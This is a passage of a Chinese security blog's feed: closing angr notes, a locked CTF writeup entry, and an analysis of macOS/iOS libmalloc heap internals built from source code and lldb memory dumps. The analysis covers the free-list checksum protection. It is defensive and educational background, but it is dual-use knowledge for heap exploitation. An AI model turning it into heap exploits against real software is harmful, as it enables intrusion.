int0x1234</code></pre><p><code>mem</code>有几点需要注意：</p><ul><li><code>.type</code>有<code>char, short, int, long, size_t, uint8_t, uint16_t</code>等</li><li><code>.resolved</code>得到bitvector；<code>.concrete</code>得到int值</li></ul></li><li><p>simulation managers</p><p>state代表了某个时刻的程序状态，那么simulation managers就代表了程序如何进入下一个state。</p><pre><code class="python">&gt;&gt;&gt; simgr = proj.factory.simulation_manager(state)&lt;SimulationManager with 1 active&gt;&gt;&gt;&gt; simgr.active[&lt;SimState @ 0x401670&gt;]</code></pre><p>这里我们用state去初始化了simulation managers得到了一组state。<code>.active</code>返回当前state。</p><pre><code class="python">&gt;&gt;&gt; simgr.step()&gt;&gt;&gt; simgr.active[&lt;SimState @ 0x1020300&gt;]&gt;&gt;&gt; simgr.active[0].regs.rip                 # new and exciting!&lt;BV64 0x1020300&gt;&gt;&gt;&gt; state.regs.rip                           # still the same!&lt;BV64 0x401670&gt;</code></pre><p>通过上面的方法去执行程序，这样会得到下一个state，此时active的state已经变了，step方法会执行到下一个basic block。之前的state仍然保留不变。</p></li></ul><h4 id="待更新"><a href="#待更新" class="headerlink" title="待更新"></a>待更新</h4><p>…</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://docs.angr.io/core-concepts/" target="_blank" rel="external">https://docs.angr.io/core-concepts/</a></li><li><a href="https://www.secpulse.com/archives/83197.html" target="_blank" rel="external">https://www.secpulse.com/archives/83197.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;angr学习笔记&quot;&gt;&lt;a href=&quot;#angr学习笔记&quot; class=&quot;headerlink&quot; title=&quot;angr学习笔记&quot;&gt;&lt;/a&gt;angr学习笔记&lt;/h3&gt;&lt;h4 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="note" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/note/"/>
    
    
      <category term="angr" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"/>
    
  </entry>
  
  <entry>
    <title>applepie writeup分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/02/applepie/applepie/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/02/applepie/applepie/</id>
    <published>2019-04-02T06:02:40.000Z</published>
    <updated>2019-04-30T04:08:21.329Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>源码解读macOS/iOS Heap</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3macos-heap/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3macos-heap/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/01/深入理解macos-heap/深入理解macos-heap/</id>
    <published>2019-04-01T07:30:31.000Z</published>
    <updated>2019-04-02T05:50:15.199Z</updated>
    
    <content type="html"><![CDATA[<h3 id="源码解读macOS-iOS-Heap"><a href="#源码解读macOS-iOS-Heap" class="headerlink" title="源码解读macOS/iOS Heap"></a>源码解读macOS/iOS Heap</h3><blockquote><p>关于linux的堆管理已经有很多人写了很多相关的分析，但在mac平台的堆相关的资料却很少。本文由tctf的一道mac平台pwn题目引起，是我对macOS/iOS的堆管理的一些理解，希望有所帮助。</p></blockquote><h4 id="从malloc说起"><a href="#从malloc说起" class="headerlink" title="从malloc说起"></a>从malloc说起</h4><p><code>malloc</code>是我们经常使用的函数，这里也是<code>libmalloc.dylib</code>暴露出来的接口，另外苹果开源了<a href="https://opensource.apple.com/source/libmalloc/" target="_blank" rel="external">libmalloc代码</a>。所以接下来我们就从源码的角度深入下去。</p><pre><code class="c">void *malloc(size_t size){    void *retval;    retval = malloc_zone_malloc(default_zone, size);    if (retval == NULL) {        errno = ENOMEM;    }    return retval;}</code></pre><p>这里实际调用了<code>malloc_zone_malloc</code>函数，传入了<code>default_zone</code>全局变量</p><pre><code class="c">static virtual_default_zone_t virtual_default_zone__attribute__((section(&quot;__DATA,__v_zone&quot;)))__attribute__((aligned(PAGE_MAX_SIZE))) = {    NULL,    NULL,    default_zone_size,    default_zone_malloc,    default_zone_calloc,    default_zone_valloc,    default_zone_free,    default_zone_realloc,    default_zone_destroy,    DEFAULT_MALLOC_ZONE_STRING,    default_zone_batch_malloc,    default_zone_batch_free,    &amp;default_zone_introspect,    10,    default_zone_memalign,    default_zone_free_definite_size,    default_zone_pressure_relief,    default_zone_malloc_claimed_address,};static malloc_zone_t *default_zone = &amp;virtual_default_zone.malloc_zone;</code></pre><p>这里初始化了一个默认的zone，正如名字一样<code>virtual_default_zone</code>其实是一个虚假的zone，接下来是调用<code>malloc_zone_malloc</code></p><pre><code class="c">void *malloc_zone_malloc(malloc_zone_t *zone, size_t size){    MALLOC_TRACE(TRACE_malloc | DBG_FUNC_START, (uintptr_t)zone, size, 0, 0);    void *ptr;    if (malloc_check_start &amp;&amp; (malloc_check_counter++ &gt;= malloc_check_start)) {        internal_check();    }    if (size &gt; MALLOC_ABSOLUTE_MAX_SIZE) {        return NULL;    }    ptr = zone-&gt;malloc(zone, size);        // if lite zone is passed in then we still call the lite methods    if (malloc_logger) {        malloc_logger(MALLOC_LOG_TYPE_ALLOCATE | MALLOC_LOG_TYPE_HAS_ZONE, (uintptr_t)zone, (uintptr_t)size, 0, (uintptr_t)ptr, 0);    }    MALLOC_TRACE(TRACE_malloc | DBG_FUNC_END, (uintptr_t)zone, size, (uintptr_t)ptr, 0);    return ptr;}</code></pre><p>这里调用的<code>ptr = zone-&gt;malloc(zone, size);</code>就是<code>default_zone_malloc</code>函数</p><pre><code class="c">static void *default_zone_malloc(malloc_zone_t *zone, size_t size){    zone = runtime_default_zone();    return zone-&gt;malloc(zone, size);}</code></pre><p>这里的<code>runtime_default_zone()</code>很重要，其实这里才是去真正的初始化zone</p><pre><code class="c">runtime_default_zone   // inline----inline_malloc_default_zone  //inline--------_malloc_initialize_once  //inline ------------_malloc_initialize()</code></pre><p>下面看<code>_malloc_initialize</code>函数，去掉了一些不相干代码</p><pre><code class="c">static void_malloc_initialize(void *context __unused){    MALLOC_LOCK();    unsigned n;    malloc_zone_t *zone = NULL;    ...    zone = create_scalable_zone(0, malloc_debug_flags);    malloc_zone_register_while_locked(zone);    malloc_set_zone_name(zone, DEFAULT_MALLOC_ZONE_STRING);        initial_default_zone = zone;    if (n != 0) { // make the default first, for efficiency        unsigned protect_size = malloc_num_zones_allocated * sizeof(malloc_zone_t *);        malloc_zone_t *hold = malloc_zones[0];        if (hold-&gt;zone_name &amp;&amp; strcmp(hold-&gt;zone_name, DEFAULT_MALLOC_ZONE_STRING) == 0) {            malloc_set_zone_name(hold, NULL);        }        mprotect(malloc_zones, protect_size, PROT_READ | PROT_WRITE);        malloc_zones[0] = malloc_zones[n];        malloc_zones[n] = hold;        mprotect(malloc_zones, protect_size, PROT_READ);    }    ...}</code></pre><p>这里主要看<code>create_scalable_zone</code>函数，所以默认的zone实际上就是scalable zone</p><pre><code class="c">malloc_zone_t *create_scalable_zone(size_t initial_size, unsigned debug_flags) {    return (malloc_zone_t *) create_scalable_szone(initial_size, debug_flags);}szone_t *create_scalable_szone(size_t initial_size, unsigned debug_flags){    szone_t *szone;    /* get memory for the zone. */    szone = mvm_allocate_pages(SZONE_PAGED_SIZE, 0, 0, VM_MEMORY_MALLOC);    if (!szone) {        return NULL;    }    ...    // Query the number of configured processors.    // Uniprocessor case gets just one tiny and one small magazine (whose index is zero). This gives    // the same behavior as the original scalable malloc. MP gets per-CPU magazines    // that scale (way) better.    unsigned int max_mags = mag_max_magazines();    uint32_t num_magazines = (max_mags &gt; 1) ? MIN(max_mags, TINY_MAX_MAGAZINES) : 1;    rack_init(&amp;szone-&gt;tiny_rack, RACK_TYPE_TINY, num_magazines, debug_flags);    rack_init(&amp;szone-&gt;small_rack, RACK_TYPE_SMALL, num_magazines, debug_flags);#if CONFIG_LARGE_CACHE    // madvise(..., MADV_REUSABLE) death-row arrivals above this threshold [~0.1%]    szone-&gt;large_entry_cache_reserve_limit = (size_t)(memsize &gt;&gt; 10);    /* &lt;rdar://problem/6610904&gt; Reset protection when returning a previous large allocation? */    int32_t libSystemVersion = NSVersionOfLinkTimeLibrary(&quot;System&quot;);    if ((-1 != libSystemVersion) &amp;&amp; ((libSystemVersion &gt;&gt; 16) &lt; 112) /* CFSystemVersionSnowLeopard */) {        szone-&gt;large_legacy_reset_mprotect = TRUE;    } else {        szone-&gt;large_legacy_reset_mprotect = FALSE;    }#endif    // Initialize the security token.    szone-&gt;cookie = (uintptr_t)malloc_entropy[0];    szone-&gt;basic_zone.version = 10;    szone-&gt;basic_zone.size = (void *)szone_size;    szone-&gt;basic_zone.malloc = (void *)szone_malloc;    szone-&gt;basic_zone.calloc = (void *)szone_calloc;    szone-&gt;basic_zone.valloc = (void *)szone_valloc;    szone-&gt;basic_zone.free = (void *)szone_free;    szone-&gt;basic_zone.realloc = (void *)szone_realloc;    szone-&gt;basic_zone.destroy = (void *)szone_destroy;    szone-&gt;basic_zone.batch_malloc = (void *)szone_batch_malloc;    szone-&gt;basic_zone.batch_free = (void *)szone_batch_free;    szone-&gt;basic_zone.introspect = (struct malloc_introspection_t *)&amp;szone_introspect;    szone-&gt;basic_zone.memalign = (void *)szone_memalign;    szone-&gt;basic_zone.free_definite_size = (void *)szone_free_definite_size;    szone-&gt;basic_zone.pressure_relief = (void *)szone_pressure_relief;    szone-&gt;basic_zone.claimed_address = (void *)szone_claimed_address;    /* Set to zero once and for all as required by CFAllocator. */    szone-&gt;basic_zone.reserved1 = 0;    /* Set to zero once and for all as required by CFAllocator. */    szone-&gt;basic_zone.reserved2 = 0;    /* Prevent overwriting the function pointers in basic_zone. */    mprotect(szone, sizeof(szone-&gt;basic_zone), PROT_READ);    szone-&gt;debug_flags = debug_flags;    _malloc_lock_init(&amp;szone-&gt;large_szone_lock);    szone-&gt;cpu_id_key = -1UL; // Unused.    CHECK(szone, __PRETTY_FUNCTION__);    return szone;}</code></pre><p>这个函数分配并且初始化了szone，设置了<code>szone_malloc</code>、<code>szone_free</code>等函数</p><p>所以后面在调用<code>malloc</code>和<code>free</code>的时候实际上调用的是<code>szone_malloc</code>、<code>szone_free</code>。<code>szone_malloc</code>的实现涉及到苹果关于堆设计中最重要的部分，这里先不展开讲解。可以看出苹果设计的这种结构很方便扩展，事实上的确如此，不仅是scalable zone，还可以注册WebKit Malloc、GFXMallocZone、QuartzCore。由对应zone的<code>malloc_zone_*</code>进行实际的内存分配工作。</p><p>下面是程序第一次调用malloc的栈帧，可以看出与我们分析的调用顺序一致</p><pre><code class="c"> *  frame #0: 0x00007fff60bd72af libsystem_malloc.dylib`create_scalable_szone    frame #1: 0x00007fff60bd6e71 libsystem_malloc.dylib`_malloc_initialize + 1482    frame #2: 0x00007fff60c0facb libsystem_platform.dylib`_os_once_callout + 18    frame #3: 0x00007fff60bd68a5 libsystem_malloc.dylib`default_zone_malloc + 77    frame #4: 0x00007fff60bd6807 libsystem_malloc.dylib`malloc_zone_malloc + 103    frame #5: 0x00007fff60bd6783 libsystem_malloc.dylib`malloc + 24    frame #6: 0x00007fff60a9831d libsystem_c.dylib`arc4_init + 109    frame #7: 0x00007fff60a98479 libsystem_c.dylib`arc4random_buf + 37    frame #8: 0x00007fff5f94644e libobjc.A.dylib`_read_images + 396    frame #9: 0x00007fff5f945473 libobjc.A.dylib`map_images_nolock + 1197    frame #10: 0x00007fff5f959279 libobjc.A.dylib`map_images + 68    ....</code></pre><h4 id="scalable-zone"><a href="#scalable-zone" class="headerlink" title="scalable zone"></a>scalable zone</h4><p>szone包含两个racks，分别是tiny和small rack</p><table><thead><tr><th>rack</th><th>32位机器</th><th>64位机器</th></tr></thead><tbody><tr><td>tiny</td><td>&lt;= 496B</td><td>&lt;= 1008B</td></tr><tr><td>small</td><td>&lt;= 128KB</td><td>&lt;=128KB</td></tr></tbody></table><p>大于127KB的就由large allocator分配，直接采用分配页大小的方式。这里不详细讨论。</p><ul><li>有几个处理器，rack就有几个magazine</li><li>每个magazine有多个regions，tiny(1MB)、small(8MB)</li><li>每个region被分为quantum，tiny(16B，64520 Q/region)、small(512B，16319 Q/region)</li></ul><p>具体可以从后面结构体中看出来其包含关系。</p><h5 id="malloc-gt-szone-malloc-gt-szone-malloc-should-clear"><a href="#malloc-gt-szone-malloc-gt-szone-malloc-should-clear" class="headerlink" title="malloc-&gt;szone_malloc-&gt;szone_malloc_should_clear"></a>malloc-&gt;szone_malloc-&gt;szone_malloc_should_clear</h5><pre><code class="c">MALLOC_NOINLINE void *szone_malloc_should_clear(szone_t *szone, size_t size, boolean_t cleared_requested){    void *ptr;    msize_t msize;    if (size &lt;= SMALL_THRESHOLD) {        // tiny size: &lt;=1008 bytes (64-bit), &lt;=496 bytes (32-bit)        // think tiny        msize = TINY_MSIZE_FOR_BYTES(size + TINY_QUANTUM - 1);        if (!msize) {            msize = 1;        }        ptr = tiny_malloc_should_clear(&amp;szone-&gt;tiny_rack, msize, cleared_requested);    } else if (size &lt;= szone-&gt;large_threshold) {        // small size: &lt;=15k (iOS), &lt;=64k (large iOS), &lt;=128k (macOS)        // think small        msize = SMALL_MSIZE_FOR_BYTES(size + SMALL_QUANTUM - 1);        if (!msize) {            msize = 1;        }        ptr = small_malloc_should_clear(&amp;szone-&gt;small_rack, msize, cleared_requested);    } else {        // large: all other allocations        size_t num_kernel_pages = round_page_quanta(size) &gt;&gt; vm_page_quanta_shift;        if (num_kernel_pages == 0) { /* Overflowed */            ptr = 0;        } else {            ptr = large_malloc(szone, num_kernel_pages, 0, cleared_requested);        }    }    return ptr;}</code></pre><p>上面可以清楚看出会根据其申请内存大小从tiny、small、large三种方式分配。这里以tiny为例</p><h5 id="tiny-malloc-should-clear"><a href="#tiny-malloc-should-clear" class="headerlink" title="tiny_malloc_should_clear"></a>tiny_malloc_should_clear</h5><pre><code class="c">void *tiny_malloc_should_clear(rack_t *rack, msize_t msize, boolean_t cleared_requested){    void *ptr;    mag_index_t mag_index = tiny_mag_get_thread_index() % rack-&gt;num_magazines;    magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);    MALLOC_TRACE(TRACE_tiny_malloc, (uintptr_t)rack, TINY_BYTES_FOR_MSIZE(msize), (uintptr_t)tiny_mag_ptr, cleared_requested);#if DEBUG_MALLOC    if (DEPOT_MAGAZINE_INDEX == mag_index) {        malloc_zone_error(rack-&gt;debug_flags, true, &quot;malloc called for magazine index -1\n&quot;);        return (NULL);    }    if (!msize) {        malloc_zone_error(rack-&gt;debug_flags, true, &quot;invariant broken (!msize) in allocation (region)\n&quot;);        return (NULL);    }#endif    SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);#if CONFIG_TINY_CACHE    ptr = tiny_mag_ptr-&gt;mag_last_free;    if (tiny_mag_ptr-&gt;mag_last_free_msize == msize) {        // we have a winner        tiny_mag_ptr-&gt;mag_last_free = NULL;        tiny_mag_ptr-&gt;mag_last_free_msize = 0;        tiny_mag_ptr-&gt;mag_last_free_rgn = NULL;        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);        CHECK(szone, __PRETTY_FUNCTION__);        if (cleared_requested) {            memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));        }#if DEBUG_MALLOC        if (LOG(szone, ptr)) {            malloc_report(ASL_LEVEL_INFO, &quot;in tiny_malloc_should_clear(), tiny cache ptr=%p, msize=%d\n&quot;, ptr, msize);        }#endif        return ptr;    }#endif /* CONFIG_TINY_CACHE */    while (1) {        ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);        if (ptr) {            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            CHECK(szone, __PRETTY_FUNCTION__);            if (cleared_requested) {                memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));            }            return ptr;        }        if (tiny_get_region_from_depot(rack, tiny_mag_ptr, mag_index, msize)) {            ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);            if (ptr) {                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                CHECK(szone, __PRETTY_FUNCTION__);                if (cleared_requested) {                    memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));                }                return ptr;            }        }        // The magazine is exhausted. A new region (heap) must be allocated to satisfy this call to malloc().        // The allocation, an mmap() system call, will be performed outside the magazine spin locks by the first        // thread that suffers the exhaustion. That thread sets &quot;alloc_underway&quot; and enters a critical section.        // Threads arriving here later are excluded from the critical section, yield the CPU, and then retry the        // allocation. After some time the magazine is resupplied, the original thread leaves with its allocation,        // and retry-ing threads succeed in the code just above.        if (!tiny_mag_ptr-&gt;alloc_underway) {            void *fresh_region;            // time to create a new region (do this outside the magazine lock)            tiny_mag_ptr-&gt;alloc_underway = TRUE;            OSMemoryBarrier();            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            fresh_region = mvm_allocate_pages_securely(TINY_REGION_SIZE, TINY_BLOCKS_ALIGN, VM_MEMORY_MALLOC_TINY, rack-&gt;debug_flags);            SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);            // DTrace USDT Probe            MAGMALLOC_ALLOCREGION(TINY_SZONE_FROM_RACK(rack), (int)mag_index, fresh_region, TINY_REGION_SIZE);            if (!fresh_region) { // out of memory!                tiny_mag_ptr-&gt;alloc_underway = FALSE;                OSMemoryBarrier();                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                return NULL;            }            ptr = tiny_malloc_from_region_no_lock(rack, tiny_mag_ptr, mag_index, msize, fresh_region);            // we don&#39;t clear because this freshly allocated space is pristine            tiny_mag_ptr-&gt;alloc_underway = FALSE;            OSMemoryBarrier();            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            CHECK(szone, __PRETTY_FUNCTION__);            return ptr;        } else {            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            yield();            SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);        }    }    /* NOTREACHED */}</code></pre><p>这里的<code>if (tiny_mag_ptr-&gt;mag_last_free_msize == msize)</code>是判断申请大小是否和缓存的大小相同，如果相同，则直接把该内存返回给程序。反之则从<code>ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);</code>free list中去获取刚好大于该大小的free list。这里的free list是按quantum的倍数递增的一个链表。若还是不能满足则去freelist中由合并得到的较大block中去分配。还不能满足则去region剩余部分申请。最后还不满足则申请新的一个region。申请失败则返回NULL。</p><h5 id="free-gt-malloc-zone-free-gt-szone-free"><a href="#free-gt-malloc-zone-free-gt-szone-free" class="headerlink" title="free-&gt;malloc_zone_free-&gt;szone_free"></a>free-&gt;malloc_zone_free-&gt;szone_free</h5><pre><code class="c">voidszone_free(szone_t *szone, void *ptr){    region_t tiny_region;    region_t small_region;#if DEBUG_MALLOC    if (LOG(szone, ptr)) {        malloc_report(ASL_LEVEL_INFO, &quot;in szone_free with %p\n&quot;, ptr);    }#endif    if (!ptr) {        return;    }    /*     * Try to free to a tiny region.     */    if ((uintptr_t)ptr &amp; (TINY_QUANTUM - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed\n&quot;, ptr);        return;    }    if ((tiny_region = tiny_region_for_ptr_no_lock(&amp;szone-&gt;tiny_rack, ptr)) != NULL) {        if (TINY_INDEX_FOR_PTR(ptr) &gt;= NUM_TINY_BLOCKS) {            malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed\n&quot;, ptr);            return;        }        free_tiny(&amp;szone-&gt;tiny_rack, ptr, tiny_region, 0);        return;    }    /*     * Try to free to a small region.     */    if ((uintptr_t)ptr &amp; (SMALL_QUANTUM - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed (2)\n&quot;, ptr);        return;    }    if ((small_region = small_region_for_ptr_no_lock(&amp;szone-&gt;small_rack, ptr)) != NULL) {        if (SMALL_META_INDEX_FOR_PTR(ptr) &gt;= NUM_SMALL_BLOCKS) {            malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed (2)\n&quot;, ptr);            return;        }        free_small(&amp;szone-&gt;small_rack, ptr, small_region, 0);        return;    }    /* check that it&#39;s a legal large allocation */    if ((uintptr_t)ptr &amp; (vm_page_quanta_size - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;non-page-aligned, non-allocated pointer %p being freed\n&quot;, ptr);        return;    }    free_large(szone, ptr);}</code></pre><p>同样，free的时候会先判断该内存是否属于tiny，small，large。则选取对应的free函数。这里以tiny为例</p><pre><code class="c">voidfree_tiny(rack_t *rack, void *ptr, region_t tiny_region, size_t known_size){    msize_t msize;    boolean_t is_free;    mag_index_t mag_index = MAGAZINE_INDEX_FOR_TINY_REGION(tiny_region);    magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);    MALLOC_TRACE(TRACE_tiny_free, (uintptr_t)rack, (uintptr_t)ptr, (uintptr_t)tiny_mag_ptr, known_size);    // ptr is known to be in tiny_region    if (known_size) {        msize = TINY_MSIZE_FOR_BYTES(known_size + TINY_QUANTUM - 1);    } else {        msize = get_tiny_meta_header(ptr, &amp;is_free);        if (is_free) {            free_tiny_botch(rack, ptr);            return;        }    }#if DEBUG_MALLOC    if (!msize) {        malloc_report(ASL_LEVEL_ERR, &quot;*** free_tiny() block in use is too large: %p\n&quot;, ptr);        return;    }#endif    SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);#if CONFIG_TINY_CACHE    // Depot does not participate in CONFIG_TINY_CACHE since it can&#39;t be directly malloc()&#39;d    if (DEPOT_MAGAZINE_INDEX != mag_index) {        if (msize &lt; TINY_QUANTUM) {                      // to see if the bits fit in the last 4 bits            void *ptr2 = tiny_mag_ptr-&gt;mag_last_free; // Might be NULL            msize_t msize2 = tiny_mag_ptr-&gt;mag_last_free_msize;            region_t rgn2 = tiny_mag_ptr-&gt;mag_last_free_rgn;            /* check that we don&#39;t already have this pointer in the cache */            if (ptr == ptr2) {                free_tiny_botch(rack, ptr);                return;            }            if ((rack-&gt;debug_flags &amp; MALLOC_DO_SCRIBBLE) &amp;&amp; msize) {                memset(ptr, SCRABBLE_BYTE, TINY_BYTES_FOR_MSIZE(msize));            }            tiny_mag_ptr-&gt;mag_last_free = ptr;            tiny_mag_ptr-&gt;mag_last_free_msize = msize;            tiny_mag_ptr-&gt;mag_last_free_rgn = tiny_region;            if (!ptr2) {                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                CHECK(szone, __PRETTY_FUNCTION__);                return;            }            msize = msize2;            ptr = ptr2;            tiny_region = rgn2;        }    }#endif /* CONFIG_TINY_CACHE */    // Now in the time it took to acquire the lock, the region may have migrated    // from one magazine to another. I.e. trailer-&gt;mag_index is volatile.    // In which case the magazine lock we obtained (namely magazines[mag_index].mag_lock)    // is stale. If so, keep on tryin&#39; ...    region_trailer_t *trailer = REGION_TRAILER_FOR_TINY_REGION(tiny_region);    mag_index_t refreshed_index;    while (mag_index != (refreshed_index = trailer-&gt;mag_index)) { // Note assignment        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);        mag_index = refreshed_index;        tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);        SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);    }    if (tiny_free_no_lock(rack, tiny_mag_ptr, mag_index, tiny_region, ptr, msize)) {        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);    }    CHECK(szone, __PRETTY_FUNCTION__);}</code></pre><p>free的时候先将该内存缓存到<code>mag_last_free</code>，若之前<code>mag_last_free</code>为NULL，那么该内存暂时不会被free，仅仅是缓存到<code>mag_last_free</code>。反之，则会将<code>mag_last_free</code>之前的内存free。在free的时候会尝试向前向后合并。合并完成后设置其前后chunk指针等metadata后将其放入对应的free list大小之中。这里需要有注意以下几点</p><ul><li>最近free的内存会被缓存，不会立即合并</li><li>在被free的块metadata是被保护的<ul><li>前后指针按16字节大小对齐</li><li>指针前4位为checksum</li></ul></li></ul><p>关于free块checksum计算如下：</p><pre><code class="c">static MALLOC_INLINE uintptr_tfree_list_checksum_ptr(rack_t *rack, void *ptr){    uintptr_t p = (uintptr_t)ptr;    return (p &gt;&gt; NYBBLE) | ((free_list_gen_checksum(p ^ rack-&gt;cookie) &amp; (uintptr_t)0xF) &lt;&lt; ANTI_NYBBLE); // compiles to rotate instruction}</code></pre><p>指针p与cookie异或然后计算checksum后左移到最高字节或上指针p右移4位得到checksumed后的指针。</p><h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>代码如下</p><pre><code class="c">#include &lt;stdio.h&gt;int main(int argc, char *argv[]) {    void *p1,*p2,*p3,*p4;    p1 = malloc(24);    p2 = malloc(24);    p3 = malloc(24);    p4 = malloc(24);    memset(p1,0xaa,24);    memset(p2,0xbb,24);    memset(p3,0xcc,24);    free(p1);    free(p3);    free(p2);    free(p4);}</code></pre><p>free(p1)，直接将p1缓存，所以内存值不变</p><pre><code class="c">(lldb) x/24gx p10x1002001f0: 0xaaaaaaaaaaaaaaaa 0xaaaaaaaaaaaaaaaa0x100200200: 0xaaaaaaaaaaaaaaaa 0x00007fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0xcccccccccccccccc 0xcccccccccccccccc0x100200240: 0xcccccccccccccccc 0x0000000000000000</code></pre><p>free(p3)，p3放入缓存，p1放入大小为32字节的freelist，p1previous指针8字节设为NULL，next指针指向设为下一个free block，紧接着后面为该block大小，2*quantum=32字节</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x0000000000000000 0x10000000100201080x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0xcccccccccccccccc 0xcccccccccccccccc0x100200240: 0xcccccccccccccccc 0x0000000000000000</code></pre><p>free(p2)，p2放入缓存，p3放入大小为32字节的freelist，p3previous指针8字节设为NULL，next指针指向设为下一个p1</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x3000000010020023 0x10000000100201080x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0x0000000000000000 0x200000001002001f0x100200240: 0xcccccccccccc0002 0x00020000000000000x100200250: 0x0000000000000000 0x00000000000000000x100200260: 0x0000000000000029 0x0000000000000000</code></pre><p>free(p4)，p2向前向后合并，合并p1，p3。指向p1，大小为6*quantum=96字节。previous指针8字节设为NULL，next指针指向设为下一个大小为3Q的block</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x0000000000000000 0x50000000100200480x100200200: 0xaaaaaaaaaaaa0006 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0x0000000000000000 0x10000000100201080x100200240: 0xcccccccccccc0002 0x00060000000000000x100200250: 0x0000000000000000 0x00000000000000000x100200260: 0x0000000000000029 0x0000000000000000</code></pre><p>上面可以看出previous和next指针前4位都包含checksum。与上面描述的一致。</p><h4 id="libmalloc中一些结构体"><a href="#libmalloc中一些结构体" class="headerlink" title="libmalloc中一些结构体"></a>libmalloc中一些结构体</h4><h5 id="szone-s-magazine-zone-h"><a href="#szone-s-magazine-zone-h" class="headerlink" title="szone_s // magazine_zone.h"></a>szone_s // magazine_zone.h</h5><pre><code class="c">typedef struct szone_s {      // vm_allocate()&#39;d, so page-aligned to begin with.    malloc_zone_t basic_zone; // first page will be given read-only protection    uint8_t pad[PAGE_MAX_SIZE - sizeof(malloc_zone_t)];    unsigned long cpu_id_key; // unused    // remainder of structure is R/W (contains no function pointers)    unsigned debug_flags;    void *log_address;    /* Allocation racks per allocator type. */    struct rack_s tiny_rack;    struct rack_s small_rack;    /* large objects: all the rest */    _malloc_lock_s large_szone_lock MALLOC_CACHE_ALIGN; // One customer at a time for large    unsigned num_large_objects_in_use;    unsigned num_large_entries;    large_entry_t *large_entries; // hashed by location; null entries don&#39;t count    size_t num_bytes_in_large_objects;#if CONFIG_LARGE_CACHE    int large_entry_cache_oldest;    int large_entry_cache_newest;    large_entry_t large_entry_cache[LARGE_ENTRY_CACHE_SIZE]; // &quot;death row&quot; for large malloc/free    boolean_t large_legacy_reset_mprotect;    size_t large_entry_cache_reserve_bytes;    size_t large_entry_cache_reserve_limit;    size_t large_entry_cache_bytes; // total size of death row, bytes#endif    /* flag and limits pertaining to altered malloc behavior for systems with     * large amounts of physical memory */ 